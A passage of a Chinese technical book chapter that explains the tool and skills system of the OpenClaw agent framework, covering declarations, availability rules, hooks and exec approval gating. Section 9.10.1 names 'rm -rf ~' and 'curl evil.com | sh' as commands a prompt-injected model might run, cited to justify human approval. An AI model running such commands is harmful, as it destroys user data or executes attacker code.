# 第 09 章 工具与技能系统

> 代码版本锁定：`openclaw/openclaw@50a2481652`（tag `v2026.5.18`，2026-05-18）。
> 本章所有 `file:line` 引用均为仓库根相对路径。

## 9.1 本章要解决的问题

OpenClaw 的 AI 助手不是一个纯文本生成器，它必须能"动手"：执行 shell 命令、搜索网页、生成图片、给用户发消息、派生子 agent。这些能力在代码里统一叫做**工具（tool）**。围绕工具，本章要回答以下几个相互关联的问题：

1. 一个工具究竟由哪些部分组成？谁来定义它、谁来注册它、它最终怎样以一份 schema 出现在模型的请求里？
2. 模型回吐一个 `tool_call` 之后，运行时怎样把这个名字匹配到一段可执行代码？
3. 工具的执行结果（文本、图片、错误）怎样回灌进 agent 的下一轮上下文？
4. `exec`（执行任意 shell）这类危险工具，怎样在执行前被拦下来走"人工审批"？
5. `skills/` 目录里那些 Markdown 文件是什么？它们和工具是什么关系，怎样被加载？
6. MCP（Model Context Protocol）在这套体系里扮演什么角色？OpenClaw 既是 MCP 客户端又是 MCP 服务端，分别在哪些场景。

阅读本章前建议先读第 06 章（agent 运行循环）与第 08 章（会话与 channel）。工具系统大量复用 agent 的运行上下文。

## 9.2 两套"工具"概念：先厘清术语

OpenClaw 代码里存在两个看起来都叫"工具"但层级不同的东西，初读源码极易混淆，必须先分清：

<svg viewBox="0 0 760 300" xmlns="http://www.w3.org/2000/svg" class="figure-svg" role="img" aria-label="工具系统两层架构：声明层与运行时层">
  <defs>
    <marker id="ar1" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto">
      <path d="M0,0 L10,5 L0,10 z" fill="#94a3b8"/>
    </marker>
  </defs>
  <rect x="10" y="10" width="120" height="120" rx="6" fill="#f1f5f9" stroke="#cbd5e1" stroke-width="1"/>
  <text x="70" y="32" text-anchor="middle" font-size="12" font-weight="700" fill="#ea580c">纯函数层</text>
  <text x="70" y="50" text-anchor="middle" font-size="10" fill="#64748b">（无运行时副作用）</text>
  <rect x="150" y="10" width="580" height="120" rx="6" fill="#fed7aa" stroke="#ea580c" stroke-width="1.5"/>
  <text x="440" y="36" text-anchor="middle" font-size="13" font-weight="700" fill="#ea580c">src/tools/ —— ToolDescriptor 协议</text>
  <text x="440" y="56" text-anchor="middle" font-size="11" fill="#64748b">名字 / schema / owner / 可用性表达式</text>
  <text x="440" y="76" text-anchor="middle" font-size="11" fill="#64748b">buildToolPlan() 决定哪些工具可见</text>
  <text x="440" y="110" text-anchor="middle" font-size="10" fill="#94a3b8">src/tools/types.ts:39</text>
  <line x1="440" y1="130" x2="440" y2="160" stroke="#94a3b8" stroke-width="1.2" marker-end="url(#ar1)"/>
  <text x="500" y="150" font-size="10" fill="#64748b">仅是"声明 + 规划"</text>
  <rect x="10" y="170" width="120" height="110" rx="6" fill="#f1f5f9" stroke="#cbd5e1" stroke-width="1"/>
  <text x="70" y="194" text-anchor="middle" font-size="12" font-weight="700" fill="#0d9488">运行时层</text>
  <text x="70" y="212" text-anchor="middle" font-size="10" fill="#64748b">（真正可执行）</text>
  <rect x="150" y="170" width="580" height="110" rx="6" fill="#99f6e4" stroke="#0d9488" stroke-width="1.5"/>
  <text x="440" y="196" text-anchor="middle" font-size="13" font-weight="700" fill="#0d9488">src/agents/tools/ —— AnyAgentTool</text>
  <text x="440" y="216" text-anchor="middle" font-size="11" fill="#64748b">带 execute() 的具体工具实现</text>
  <text x="440" y="236" text-anchor="middle" font-size="11" fill="#64748b">createOpenClawTools() 装配实例</text>
  <text x="440" y="264" text-anchor="middle" font-size="10" fill="#94a3b8">src/agents/tools/common.ts:30</text>
</svg>
<span class="figure-caption">图 R9.1 ｜ 工具系统两层架构：声明层（src/tools/）只描述工具形状，运行时层（src/agents/tools/）才真正执行</span>

<details>
<summary>ASCII 原版</summary>

```
                      ┌─────────────────────────────────────┐
   纯函数层            │  src/tools/  —— ToolDescriptor 协议   │
   （无运行时副作用）   │  名字 / schema / owner / 可用性表达式  │
                      │  buildToolPlan() 决定哪些工具可见      │
                      └──────────────┬──────────────────────┘
                                     │ 仅是"声明 + 规划"
                                     ▼
                      ┌─────────────────────────────────────┐
   运行时层            │  src/agents/tools/  —— AnyAgentTool   │
   （真正可执行）       │  带 execute() 的具体工具实现           │
                      │  createOpenClawTools() 装配实例        │
                      └─────────────────────────────────────┘
```

</details>

- `src/tools/`：一个**纯声明层**，只描述"一个工具长什么样"。它定义了 `ToolDescriptor` 类型、可用性表达式（availability expression）、以及 `buildToolPlan()` 规划器。它不依赖任何 agent 运行时，不能执行任何东西。这一层存在的理由是：core 需要在**不加载插件运行时**的前提下，回答"这个工具现在该不该暴露给模型"。参见 `src/tools/types.ts:39`。
- `src/agents/tools/`：**运行时实现层**。每个文件导出一个 `create*Tool()` 工厂，返回一个带 `execute()` 方法的 `AnyAgentTool`（`src/agents/tools/common.ts:30`）。这是模型真正调用时跑的代码。

为什么要拆成两层？因为 OpenClaw 有大量"冷路径"场景需要列举工具但不想付出加载成本——例如 CLI 的 `openclaw doctor`、setup 向导、插件清单扫描。这些场景只需要 `ToolDescriptor`（名字 + schema + 可用性），不需要 `execute()`。把声明与实现分离，使得 core 在冷路径上保持轻量，这是 `AGENTS.md:44` 所说的"热路径携带准备好的事实，不要用宽泛 loader 反复重新发现"的一个具体体现。

本章接下来先讲声明层（9.3–9.5），再讲运行时层（9.6–9.9），然后讲审批门控（9.10）、技能（9.11）、MCP（9.12）。

## 9.3 声明层：ToolDescriptor 协议

### 9.3.1 ToolDescriptor 的结构

`ToolDescriptor` 是声明层的核心类型，定义在 `src/tools/types.ts:39`：

```ts
export type ToolDescriptor = {
  readonly name: string;
  readonly title?: string;
  readonly description: string;
  readonly inputSchema: JsonObject;
  readonly outputSchema?: JsonObject;
  readonly owner: ToolOwnerRef;
  readonly executor?: ToolExecutorRef;
  readonly availability?: ToolAvailabilityExpression;
  readonly annotations?: JsonObject;
  readonly sortKey?: string;
};
```

逐字段说明设计意图：

- `name` / `description` / `inputSchema`：这三个是**模型可见的部分**。`name` 是模型在 `tool_call` 里写的名字；`inputSchema` 是一份 JSON Schema，描述参数。
- `owner`（`ToolOwnerRef`，`src/tools/types.ts:10`）：标记这个工具**归谁所有**——core、某个插件、某个 channel、还是某个 MCP server。这个字段不暴露给模型，它服务于审计与边界检查。
- `executor`（`ToolExecutorRef`，`src/tools/types.ts:16`）：标记"谁来执行"。注意 owner 与 executor 是两个独立的引用——一个 core 工具可能委托给某个插件执行。
- `availability`（`ToolAvailabilityExpression`）：一个**布尔表达式**，决定这个工具当前是否该暴露。下一节详述。
- `sortKey`：决定工具在最终 plan 里的排序。为什么要有确定性排序？因为 `AGENTS.md:50` 明确要求"map/set/registry/插件列表在进入模型/工具 payload 前必须确定性排序"——这直接关系到 prompt cache 命中率。工具列表只要顺序抖动，整段缓存就失效。

`owner` 与 `executor` 都是**判别联合（discriminated union）**。例如 `ToolExecutorRef` 的 `mcp` 变体携带 `serverId` 与 `toolName`（`src/tools/types.ts:20`）。`formatToolExecutorRef()`（`src/tools/execution.ts:3`）把它格式化成 `mcp:serverId:toolName` 这样的稳定字符串，用于日志与诊断。

### 9.3.2 用 defineToolDescriptor 定义

声明层提供了两个近乎恒等函数的辅助器，`src/tools/descriptors.ts:3`：

```ts
export function defineToolDescriptor(descriptor: ToolDescriptor): ToolDescriptor {
  return descriptor;
}
```

它什么也不做，只是返回入参。存在的唯一意义是**给 TypeScript 提供类型锚点**——调用 `defineToolDescriptor({...})` 时，对象字面量会被精确地按 `ToolDescriptor` 检查，而不是被推断为宽松的结构类型。这是 OpenClaw 代码库里反复出现的模式（`definePluginEntry`、`defineBundledChannelEntry` 同理），属于"零运行时成本的类型纪律"。

## 9.4 可用性表达式：工具为什么会"消失"

模型看到的工具列表不是固定的。一个用户如果没配 Brave API key，就不该看到 `web_search`——否则模型会去调它然后拿到一个"未配置"错误，白白浪费一个 turn。OpenClaw 用**可用性表达式**在工具进入模型 payload 之前就把它筛掉。

### 9.4.1 信号与表达式

基本单元是 `ToolAvailabilitySignal`（`src/tools/types.ts:22`），共六种：

| 信号 kind        | 含义                                  |
|------------------|---------------------------------------|
| `always`         | 永远可用                              |
| `auth`           | 某个 provider 已完成鉴权              |
| `config`         | 配置树某个路径存在/非空/可用          |
| `env`            | 某个环境变量已设置                    |
| `plugin-enabled` | 某个插件已启用                        |
| `context`        | 运行时上下文某个键存在或等于某值      |

信号之上是 `ToolAvailabilityExpression`（`src/tools/types.ts:34`）——它要么是单个信号，要么是 `{ allOf: [...] }` 或 `{ anyOf: [...] }`，可以任意嵌套。这是一棵小型布尔表达式树。

### 9.4.2 求值算法

求值入口是 `evaluateToolAvailability()`（`src/tools/availability.ts:155`）。它不返回布尔值，而是返回一个**诊断数组** `ToolAvailabilityDiagnostic[]`：

- 数组为空 → 工具可用；
- 数组非空 → 工具不可用，且每个诊断说明了"缺什么"（`auth-missing` / `config-missing` / `env-missing` / `plugin-disabled` / `context-mismatch`，见 `src/tools/types.ts:65`）。

为什么返回诊断而不是 `true/false`？因为隐藏一个工具时，运行时往往要告诉用户"为什么"。例如 doctor 命令会把这些诊断渲染成"web_search 不可用：缺少 BRAVE_API_KEY"。

`allOf` 与 `anyOf` 的语义在 `evaluateExpression()`（`src/tools/availability.ts:116`）里：

```ts
if ("anyOf" in expression) {
  if (expression.anyOf.length === 0) {
    return [{ reason: "unsupported-signal", message: "Empty availability anyOf group" }];
  }
  const diagnostics = expression.anyOf.map((entry) => evaluateExpression(entry, context));
  return diagnostics.some((entries) => entries.length === 0) ? [] : diagnostics.flat();
}
```

`anyOf`：只要有一个子表达式求值为"空诊断"（即可用），整组就可用。`allOf` 则是把所有子诊断 `flatMap` 拼起来（`src/tools/availability.ts:133`）。注意一个细节：**空的 `allOf` / `anyOf` 组被显式判为错误**而不是"真空真"。这是有意的防御——一个空表达式几乎一定是配置/代码 bug，与其静默放行不如报 `unsupported-signal`。

`config` 信号的求值还支持三档检查 `exists` / `non-empty` / `available`（`src/tools/availability.ts:30` 的 `hasConfiguredValue`）。`available` 档把判断委托回调用方传入的 `isConfigValueAvailable`，因为"一个 provider 配置块是否真的可用"这种判断属于业务逻辑，声明层不该硬编码。

### 9.4.3 buildToolPlan：从描述符到工具计划

`buildToolPlan()`（`src/tools/planner.ts:32`）把一组 `ToolDescriptor` 转换成一份 `ToolPlan`：

```ts
export function buildToolPlan(options: BuildToolPlanOptions): ToolPlan {
  const descriptors = options.descriptors.toSorted(compareDescriptors);
  assertUniqueNames(descriptors);
  const visible: ToolPlanEntry[] = [];
  const hidden: HiddenToolPlanEntry[] = [];
  for (const descriptor of descriptors) {
    const diagnostics = [...evaluateToolAvailability({ descriptor, context: options.availability })];
    if (diagnostics.length > 0) {
      hidden.push({ descriptor, diagnostics });
      continue;
    }
    if (!descriptor.executor) {
      throw new ToolPlanContractError({ code: "missing-executor", ... });
    }
    visible.push({ descriptor, executor: descriptor.executor });
  }
  return { visible, hidden };
}
```

三个值得注意的契约（`ToolPlanContractError`，`src/tools/diagnostics.ts:3`）：

1. **排序优先**——先 `toSorted(compareDescriptors)`，`compareDescriptors`（`src/tools/planner.ts:11`）先比 `sortKey` 再比 `name`。确定性排序是 prompt cache 的前提。
2. **名字必须唯一**——`assertUniqueNames()`（`src/tools/planner.ts:18`）发现重名直接抛 `duplicate-tool-name`。模型用名字寻址工具，重名意味着歧义，必须 fail-fast。
3. **可见工具必须有 executor**——一个工具如果通过了可用性检查却没有 `executor`，抛 `missing-executor`。这阻止了"模型能看到一个调不动的工具"这种坏状态。

`ToolPlan` 把工具分成 `visible` 和 `hidden` 两组（`src/tools/types.ts:89`）。`visible` 进入模型 payload，`hidden` 带着诊断保留下来——后者用于"为什么这个工具不在"的解释。

### 9.4.4 协议投影：交给 model adapter 的最小形状

`buildToolPlan` 的产物还要再"瘦身"一次才交给模型。`toToolProtocolDescriptor()`（`src/tools/protocol.ts:10`）把每个 `ToolPlanEntry` 投影成只含 `name / description / inputSchema` 的 `ToolProtocolDescriptor`：

```ts
export function toToolProtocolDescriptor(entry: ToolPlanEntry): ToolProtocolDescriptor {
  return {
    name: entry.descriptor.name,
    description: entry.descriptor.description,
    inputSchema: entry.descriptor.inputSchema,
  };
}
```

`src/tools/protocol.ts:9` 的注释点明了边界：「Shared descriptor shape only. Model/provider adapters still own schema normalization.」——也就是说，把 `inputSchema` 转成 OpenAI 风格还是 Anthropic 风格，由各 provider adapter 自己负责（见 `src/agents/openai-tool-schema.ts`），声明层只保证"形状一致"。

## 9.5 工具目录与分类

OpenClaw 的内置工具集中声明在 `src/agents/tool-catalog.ts`。`CORE_TOOL_DEFINITIONS`（`src/agents/tool-catalog.ts:52`）是一张完整的内置工具清单，每条带 `id` / `label` / `description` / `sectionId` / `profiles`。按 `sectionId` 分组（`CORE_TOOL_SECTION_ORDER`，`src/agents/tool-catalog.ts:38`）：

| section（分组）  | 工具                                                      |
|------------------|-----------------------------------------------------------|
| `fs`（文件）      | `read` `write` `edit` `apply_patch`                       |
| `runtime`        | `exec` `process` `code_execution`                         |
| `web`            | `web_search` `web_fetch` `x_search`                       |
| `memory`         | `memory_search` `memory_get`                              |
| `sessions`       | `sessions_list` `sessions_history` `sessions_send` `sessions_spawn` `sessions_yield` `subagents` `session_status` |
| `ui`             | `browser` `canvas`                                        |
| `messaging`      | `message`                                                 |
| `automation`     | `heartbeat_respond` `cron` `gateway`                      |
| `nodes`          | `nodes`                                                   |
| `agents`         | `agents_list` `update_plan`                               |
| `media`          | `image` `image_generate` `music_generate` `video_generate` `tts` |

按本章引言的分类口径，再归纳一下：

- **系统类**：`exec`（执行 shell）、`process`（管理后台进程）、`code_execution`（沙箱内远程分析）。`exec` 是审批门控的主要对象，见 9.10。
- **web 类**：`web_search`（背后可挂 Brave / DuckDuckGo / Exa / Tavily 等 provider）、`web_fetch`（抓取并提取网页正文）、`x_search`。
- **媒体类**：理解型 `image`，生成型 `image_generate` / `music_generate` / `video_generate` / `tts`。媒体生成工具的可用性由 media-factory 计划决定（`src/agents/openclaw-tools.media-factory-plan.ts`）。
- **代码/文件类**：`read` / `write` / `edit` / `apply_patch`，这些属于 `pi-coding-agent` 提供的编码工具，OpenClaw 通过 `src/agents/pi-tools.ts` 接入并加策略包装。
- **通信类**：`message`（向 channel 发消息）、`sessions_send`（向另一个会话发消息）、`sessions_spawn` / `subagents`（派生子 agent）。

### 9.5.1 工具档案（profile）

`tool-catalog.ts` 还定义了四个工具档案 `minimal` / `coding` / `messaging` / `full`（`ToolProfileId`，`src/agents/tool-catalog.ts:13`）。`CORE_TOOL_PROFILES`（`src/agents/tool-catalog.ts:323`）把每个档案映射成一个 allow 列表：

```ts
const CORE_TOOL_PROFILES: Record<ToolProfileId, ToolProfilePolicy> = {
  minimal:   { allow: listCoreToolIdsForProfile("minimal") },
  coding:    { allow: [...listCoreToolIdsForProfile("coding"), "bundle-mcp"] },
  messaging: { allow: [...listCoreToolIdsForProfile("messaging"), "bundle-mcp"] },
  full:      { allow: ["*"] },
};
```

每个工具的 `profiles` 字段声明它属于哪些档案——例如 `read` 只在 `coding`（`src/agents/tool-catalog.ts:55`），`message` 只在 `messaging`（`src/agents/tool-catalog.ts:218`），`session_status` 三个档案都在（`src/agents/tool-catalog.ts:195`）。`full` 档案的 allow 是通配 `["*"]`。

为什么需要档案？因为不同用途的 agent 不该看到同一套工具。一个纯聊天 agent 不需要 `apply_patch`，一个编码 agent 不需要 `message`。档案是工具策略的"预设"，用户在配置里选一个 profile，就一次性确定了基线工具集。`resolveCoreToolProfilePolicy()`（`src/agents/tool-catalog.ts:344`）把 profile 字符串解析成 `{ allow, deny }`，再交给工具策略管线。

### 9.5.2 工具分组

`CORE_TOOL_GROUPS`（`src/agents/tool-catalog.ts:386`）由 `buildCoreToolGroupMap()`（`src/agents/tool-catalog.ts:363`）生成。它做两件事：

1. 把每个 section 变成一个组 `group:fs`、`group:web` 等；
2. 收集所有 `includeInOpenClawGroup: true` 的工具，组成 `group:openclaw`。

`group:openclaw` 是"OpenClaw 特有工具"的集合（如 `cron`、`gateway`、`sessions_*`、媒体生成工具），区别于来自 `pi-coding-agent` 的通用编码工具。这个分组在工具策略里可以被整组 allow/deny。

## 9.6 运行时层：工具实例怎样被装配

声明层讲完了，现在进入真正能跑的工具。

### 9.6.1 AnyAgentTool

运行时工具的类型是 `AnyAgentTool`（`src/agents/tools/common.ts:30`）。它是上游 `pi-agent-core` 的 `AgentTool` 加上 OpenClaw 的扩展字段：

```ts
export type AnyAgentTool = Omit<AgentTool<TSchema, unknown>, "execute"> &
  ErasedAgentToolExecute & {
    ownerOnly?: boolean;
    displaySummary?: string;
  };
```

关键点：

- `execute()` 被"擦除类型"（`ErasedAgentToolExecute`，`src/agents/tools/common.ts:20`）——参数从精确的 `TSchema` 推断类型擦成 `unknown`。这样不同 schema 的工具才能放进同一个数组。代价是每个工具的 `execute` 内部必须自己用 `asToolParamsRecord()`（`src/agents/tools/common.ts:36`）把 `unknown` 收窄成对象。
- `ownerOnly`：标记这个工具只有"owner"身份的发送者能调用。`message` / `gateway` 这类能对外发消息或控制网关的工具是 owner-only。违规调用会抛 `ToolAuthorizationError`（`src/agents/tools/common.ts:67`，HTTP 403）。
- `displaySummary`：给 UI 用的一句话摘要。

`common.ts` 还提供了一组参数读取辅助器，例如 `readStringParam()`（`src/agents/tools/common.ts:89`，三个重载实现工具调用方的类型安全）。它内部走 `readSnakeCaseParamRaw()`（`src/param-key.ts`），这意味着工具参数同时接受 `snake_case` 与 `camelCase`——不同模型吐参数的命名习惯不一致，工具层做了归一。

### 9.6.2 createOpenClawTools：装配入口

把所有运行时工具实例拼起来的总装配函数是 `createOpenClawTools()`（`src/agents/openclaw-tools.ts:69`）。文件顶部 import 了一长串 `create*Tool` 工厂（`src/agents/openclaw-tools.ts:33`–`56`）：`createCronTool`、`createGatewayTool`、`createImageTool`、`createMessageTool`、`createSessionsSpawnTool`、`createWebSearchTool`、`createWebFetchTool` 等。

装配的核心模式是"候选 + 过滤"。每个工厂在条件不满足时返回 `null`（例如 `createWebSearchTool` 在 web_search 被禁用时返回 `null`，`src/agents/tools/web-search.ts:78`）。装配完后用 `collectPresentOpenClawTools()`（`src/agents/openclaw-tools.registration.ts:5`）把所有 `null/undefined` 滤掉：

```ts
export function collectPresentOpenClawTools(
  candidates: readonly (AnyAgentTool | null | undefined)[],
): AnyAgentTool[] {
  return candidates.filter((tool): tool is AnyAgentTool => tool !== null && tool !== undefined);
}
```

为什么用"返回 null"而不是"在装配处写 if"？因为"这个工具该不该存在"的判断逻辑属于工具自己——`createWebSearchTool` 最清楚 web_search 何时该禁用。把判断放进工厂，装配处就只剩一行 `filter`，符合 `AGENTS.md` 的"把判断移到正确的边界"。

`createOpenClawTools()` 的 `options`（`src/agents/openclaw-tools.ts:70`–`90`）携带了大量运行时事实：`agentSessionKey`、`runSessionKey`、`agentChannel`、`agentAccountId`、`agentTo`、`sandboxRoot`、`sandboxFsBridge` 等。这些事实在装配时一次性注入工具闭包，工具执行时无需再去全局查找——同样是"热路径携带准备好的事实"。

### 9.6.3 update_plan 工具的条件启用

并非所有工具都简单地"配了就有"。`update_plan` 工具的启用由 `isUpdatePlanToolEnabledForOpenClawTools()`（`src/agents/openclaw-tools.registration.ts:11`）决定：

```ts
export function isUpdatePlanToolEnabledForOpenClawTools(params): boolean {
  const configured = params.config?.tools?.experimental?.planTool;
  if (configured !== undefined) {
    return configured;
  }
  return isStrictAgenticExecutionContractActive({ ... });
}
```

逻辑分两层：用户配置里如果显式写了 `tools.experimental.planTool`，就用配置值；否则回退到"严格 agentic 执行契约是否激活"。这种"显式配置优先、否则按运行时契约推断"的模式在工具启用判断里反复出现。

## 9.7 pi-tools：接入 pi-coding-agent 的编码工具

`read` / `write` / `edit` / `apply_patch` / `exec` / `process` 这批工具不是 OpenClaw 原生的，而是来自上游 `@earendil-works/pi-coding-agent`。OpenClaw 在 `src/agents/pi-tools.ts`（1101 行）里把它们接进来，并加上自己的策略层。

为什么不直接用上游工具？因为上游工具不知道 OpenClaw 的安全边界：文件系统沙箱、工作区根目录限制、owner-only 门控、`before_tool_call` 钩子。`pi-tools.ts` 做的就是"在上游工具外面套一层 OpenClaw 策略"。几个关键关注点：

- **文件系统策略**：`tool-fs-policy.ts` 定义 `ToolFsPolicy`，约束 `read`/`write`/`edit` 能碰哪些路径。沙箱模式下路径被锁在工作区根内（`pi-tools.read.workspace-root-guard` 系列测试）。
- **工具参数 schema**：`pi-tools-parameter-schema.ts` / `pi-tools.schema.ts` 负责把 pi 工具的参数 schema 适配成 OpenClaw 的形状，并补上 Claude 风格的别名（`pi-tools.create-openclaw-coding-tools.adds-claude-style-aliases-schemas...` 测试印证）。
- **`before_tool_call` 包装**：见 9.8。

## 9.8 工具解析与执行：从 tool_call 到结果

### 9.8.1 解析（resolution）

模型回吐的 `tool_call` 里只有一个 `name` 和一段 JSON 参数。运行时怎样找到对应的 `execute()`？

答案：agent 在构造运行循环时，已经把可用工具装进了一个**按 name 索引的数组/表**。`createOpenClawTools()` 返回的 `AnyAgentTool[]` 与插件工具（`resolvePluginTools()`，见第 10 章）合并，每个工具的 `name` 字段就是寻址键。模型给出 `name` → 运行时在这张表里查 → 拿到工具对象 → 调它的 `execute()`。`buildToolPlan` 的 `assertUniqueNames()`（9.4.3）保证了这张表里 name 不重复，解析才是确定的。

注意：解析在**进入模型之前**就已经隐含完成了——能进入模型 payload 的工具，一定已经在表里。模型不可能 `tool_call` 一个表外的名字（除非模型幻觉，那种情况运行时报"未知工具"错误）。

### 9.8.2 执行与 before_tool_call 钩子

工具执行不是直接调 `execute()`，而是先穿过 `before_tool_call` 钩子层。`pi-tools.before-tool-call.ts` 负责这件事。`isToolWrappedWithBeforeToolCallHook()` / `wrapToolWithBeforeToolCallHook()`（在 `src/agents/openclaw-tools.ts:23` import）会把工具的 `execute` 包一层。

`hasBeforeToolCallHook()`（`src/agents/pi-tools.before-tool-call.ts:87`）判断是否需要包装：

```ts
return getGlobalHookRunner()?.hasHooks("before_tool_call") === true || hasTrustedToolPolicies();
```

只有当存在 `before_tool_call` 钩子或受信任工具策略时，才付出包装成本——没有钩子就不包，零开销。

包装后的执行流程（`src/agents/pi-tools.before-tool-call.ts:509` 起）：

1. 调用 `hookRunner.runBeforeToolCall()`，把工具名与参数交给所有注册的 `before_tool_call` 钩子（`src/agents/pi-tools.before-tool-call.ts:598`）。
2. 钩子可以返回三种决策：
   - `block`：拦截这次调用，工具不执行，模型收到一条 `Tool call blocked by plugin hook` 错误（`src/agents/pi-tools.before-tool-call.ts:611`）。
   - `requireApproval`：把这次调用转入审批流程（`src/agents/pi-tools.before-tool-call.ts:621`）。
   - 放行（可能附带改写后的参数）。
3. 放行后才真正调原始 `execute()`。

`before_tool_call` 是 fail-closed 的——`src/plugins/hook-runner-global.ts:43` 的 `failurePolicyByHook` 里把 `before_tool_call` 设为 `"fail-closed"`，意味着钩子自己抛异常时，默认**拦截**工具调用而非放行。安全相关的钩子失败必须保守。

### 9.8.3 结果回灌

工具 `execute()` 返回一个 `AgentToolResult`。结果回灌进 agent 上下文的路径上有几个关注点：

- **图片清洗**：`src/agents/tools/common.ts:11` import 的 `sanitizeToolResultImages()` 会对工具结果里的图片做尺寸/格式清洗（`ImageSanitizationLimits`），避免超大图片撑爆上下文 token。
- **结果守卫**：`session-tool-result-guard.ts` 负责把工具结果安全地写入会话 transcript，并触发 `tool_result_persist` 钩子。
- **after_tool_call 钩子**：执行完成后触发 `after_tool_call` 钩子（`pi-tool-definition-adapter.after-tool-call` 系列测试印证它"只触发一次"）。

结果回灌完成后，agent 把工具结果作为一条新消息加入上下文，进入下一轮模型调用——这就是 agent 工具循环。

## 9.9 web 工具：一个完整的工具样例

以 `web_search` 为例走一遍，它最能说明工具如何与 provider、配置、插件协作。

`createWebSearchTool()`（`src/agents/tools/web-search.ts:72`）：

```ts
export function createWebSearchTool(options?): AnyAgentTool | null {
  if (isWebSearchDisabled(options?.config)) {
    return null;
  }
  return {
    label: "Web Search",
    name: "web_search",
    description: "Search web for current info; returns normalized provider results.",
    parameters: WebSearchSchema,
    execute: async (_toolCallId, args, signal) => {
      const { config, preferRuntimeProviders, runtimeWebSearch } =
        resolveWebSearchToolRuntimeContext({ ... });
      if (isWebSearchDisabled(config)) {
        throw new Error("web_search is disabled.");
      }
      const result = await runWebSearch({ config, ..., args: asToolParamsRecord(args), signal });
      return jsonResult({ ...result.result, provider: result.provider });
    },
  };
}
```

几个设计点：

1. **工厂返回 null 表示"不存在"**——`web_search` 被禁用时整个工具不出现。
2. **execute 内部还做一次 `isWebSearchDisabled` 检查**——因为运行时配置可能晚绑定（`lateBindRuntimeConfig`），工厂创建时启用、执行时被禁用的窗口存在，必须二次确认。
3. **真正的搜索委托给 `runWebSearch()`**——工具本身不知道用哪个搜索引擎。具体 provider（Brave / DuckDuckGo / Exa / Tavily / Perplexity / Firecrawl ...）由**插件**注册。`extensions/exa/index.ts` 通过 `api.registerWebSearchProvider(createExaWebSearchProvider())` 把 Exa 注册进来。工具调 `runWebSearch` → provider 解析层选出当前可用的 provider → 真正发 HTTP 请求。

这正是 core/插件分离的体现：`web_search` 工具是 core 的（通用工具循环属于 core），但"用哪个搜索引擎、怎么发 HTTP、怎么鉴权"是插件的（`AGENTS.md:43`：「Providers own auth/catalog/runtime hooks; core owns generic loop」）。`web_fetch` 工具结构类似（`src/agents/tools/web-fetch.ts`），背后可挂 Firecrawl 等抓取 provider。

结果归一也很重要：`runWebSearch` 返回的结果带 `provider` 字段（`src/agents/tools/web-search.ts:107`），无论背后是哪个引擎，工具给模型的结果形状一致。模型不需要知道用了哪个搜索引擎。

## 9.10 审批门控：exec 工具如何走人工审批

`exec` 工具能执行任意 shell 命令，这是 OpenClaw 里最危险的能力。审批门控（approval gating）让某些命令在执行前**必须经过用户确认**。

### 9.10.1 为什么需要审批

一个被 prompt 注入攻击的模型可能会 `exec("rm -rf ~")` 或 `exec("curl evil.com | sh")`。审批门控是"模型决定要跑什么"与"命令真正落地"之间的人工闸门。它不是把所有命令都拦下来——那样 agent 就没法用了——而是按一套安全策略，把"足够危险"的命令转入审批。

### 9.10.2 审批请求的构造

审批的核心数据结构是 `RequestExecApprovalDecisionParams`（`src/agents/bash-tools.exec-approval-request.ts:31`）：

```ts
export type RequestExecApprovalDecisionParams = {
  id: string;
  command?: string;
  commandArgv?: string[];
  systemRunPlan?: SystemRunApprovalPlan;
  env?: Record<string, string>;
  cwd: string | undefined;
  nodeId?: string;
  host: "gateway" | "node";
  security: ExecSecurity;
  ask: ExecAsk;
  warningText?: string;
  commandSpans?: ExecApprovalCommandSpan[];
  ...
};
```

几个字段的意义：

- `command` / `commandArgv`：要执行的命令，文本形式和 argv 形式都带上——审批 UI 既要能展示可读文本，又要能精确高亮 token。
- `host`：命令在哪执行——`gateway` 还是某个远程 `node`。审批要让用户知道"这命令将在哪台机器上跑"。
- `security` / `ask`：安全级别与询问策略，决定这条命令是否需要审批、需要哪种审批。
- `warningText`：给用户看的危险提示。
- `commandSpans`：命令文本的分段高亮信息——审批 UI 用它把命令里的可执行名、危险参数等标出来。`commandSpans` 的计算由一个**惰性加载的 runtime 模块**完成（`loadExecApprovalCommandSpansRuntime()`，`src/agents/bash-tools.exec-approval-request.ts:24`），因为命令解析逻辑较重，只在真要发审批时才加载。

### 9.10.3 两阶段审批

`buildExecApprovalRequestToolParams()`（`src/agents/bash-tools.exec-approval-request.ts:57`）构造出的请求参数里有 `twoPhase: true`（`src/agents/bash-tools.exec-approval-request.ts:82`）。两阶段的含义是：

1. **请求阶段**：agent 发出审批请求，带一个 `id`，然后**让出 turn**（不阻塞 agent 进程）。
2. **决策阶段**：用户在某个 channel 上批准/拒绝，决策带着同一个 `id` 回来，agent 在下一个 turn 拿到决策再决定是否执行。

为什么要两阶段？因为审批可能要等很久（用户在睡觉），不能让 agent 进程一直阻塞等待。两阶段把"请求"和"决策"解耦成两个独立的 turn。超时由 `DEFAULT_APPROVAL_TIMEOUT_MS`（`src/agents/bash-tools.exec-runtime.js`）控制。审批后续状态由 `bash-tools.exec-approval-followup.ts` 与 `bash-tools.exec-approval-followup-state.ts` 跟踪。

审批请求最终通过 `callGatewayTool()`（`src/agents/bash-tools.exec-approval-request.ts:17` import）发往 gateway，由 gateway 把审批卡片投递到用户所在 channel。

### 9.10.4 exec 工具的描述会自适应

`describeExecTool()`（`src/agents/bash-tools.descriptions.ts:16`）生成给模型看的 `exec` 工具描述。它不是固定字符串——它会根据当前平台和已配置的审批规则动态拼装：

```ts
export function describeExecTool(params?): string {
  const base = [
    "Execute shell commands with background continuation for work that starts now.",
    "Use yieldMs/background to continue later via process tool.",
    ...
    params?.hasCronTool
      ? "Do not use exec sleep or delay loops for reminders or deferred follow-ups; use cron instead."
      : undefined,
    "Use pty=true for TTY-required commands (terminal UIs, coding agents).",
  ].filter(Boolean).join(" ");
  if (process.platform !== "win32") {
    return base;
  }
  // Windows 下追加大量平台特定告诫
  ...
}
```

它甚至会读取 `loadExecApprovals()`（`src/agents/bash-tools.descriptions.ts:2`）把已批准的命令 token 写进描述——目的是让模型知道"哪些命令已经预批准、可以直接跑"，减少不必要的审批往返。工具描述本身是"运行时事实"的载体。

## 9.11 skills 技能系统

### 9.11.1 技能是什么

技能（skill）不是工具。工具是模型能直接调用的函数；技能是一段**给模型读的指令文档**。`skills/` 目录下每个子目录是一个技能，核心文件是 `SKILL.md`。例如 `skills/summarize/SKILL.md`：

```markdown
---
name: summarize
description: "Summarize or transcribe URLs, YouTube/videos, podcasts, articles, transcripts, PDFs, and local files."
homepage: https://summarize.sh
metadata:
  { "openclaw": { "emoji": "🧾", "requires": { "bins": ["summarize"] },
